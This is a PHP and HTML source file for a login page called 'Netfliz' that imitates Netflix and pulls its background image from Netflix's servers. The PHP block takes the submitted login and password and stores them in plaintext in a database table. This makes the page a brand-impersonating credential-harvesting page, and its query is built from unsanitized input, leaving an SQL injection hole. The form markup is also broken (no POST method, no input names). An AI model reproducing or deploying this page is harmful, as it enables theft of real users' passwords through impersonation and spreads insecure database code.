<?php
if(isset($_POST['submit'])){
    include_once('config.php');

    $login=$_POST['login'];
    $senha=$_POST['senha'];

    $result = mysqli_query($conexao, "INSERT INTO entrar(login, senha) values('$login', '$senha')");
}



?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>netfliz</title>
    
</head>
<style>
.body{
    background-image: url(https://assets.nflxext.com/ffe/siteui/vlv3/e89c9679-2f5f-491d-924c-c58924a8ee4b/f9c4098e-22e1-4b5c-b668-47519ee56dc7/BR-pt-20221121-popsignuptwoweeks-perspective_alpha_website_large.jpg);

    background-size: cover;
    background-repeat: no-repeat;
}

#logo {
    width: fit-content;
    height: fit-content;
    background-color:black;
    opacity: 0.5;
}
#logo h1{
    width: auto;
    height: auto;
    color: red;
    font-size: 60px;
    display: flex;
    text-align: center;
    align-items: center;
    justify-content: center;
    
    
}

.login{
width: 400px;
height: 500px;
margin: auto;
overflow: hidden;
background-color: #000000BF;

}

.entrar{
    padding: 50px;
    color: #fff;
    font-size: 30px;
}
.login2{
    width: 245px;
    height: 45px;
    padding: 30px;
    color: #fff;
    font-size: 30px;
}
.senha{
    width: 245px;
    height: 45px;
    padding: 30px;
    color: #fff;
    font-size: 30px;
}
h6 {
    width: 250px;
    height: 150px;
    padding: 30px;
    color: white;
    font-size: 15px;
}
    </style>

<body class= "body">
<header>  
<div id="logo">
        <h1 >Netfliz</h1>
  </div>
</header>
<main>
  <form>
<div class='login'>

<legend class = 'entrar'>ENTRAR</legend>
<label class = 'login2'>  </label>
<input type='text' placeholder='login' id='login' style='width: 245px; height: 45px; border-radius: 5px; margin-left: 10px; background:white;' />
<br>
<br>
<br>
<label class = 'senha'></label>
<input type='password' placeholder='senha' id='senha' style='width: 245px; height: 45px; border-radius: 5px; margin-left: 10px; background:white;' />

<input type='submit' name ='submit' id= 'submit'/>
<h6><input type='checkbox' name = 'box' /> lembre-se de mim</h6>

</div>


  </form>

</main>

  
</body>
</html>
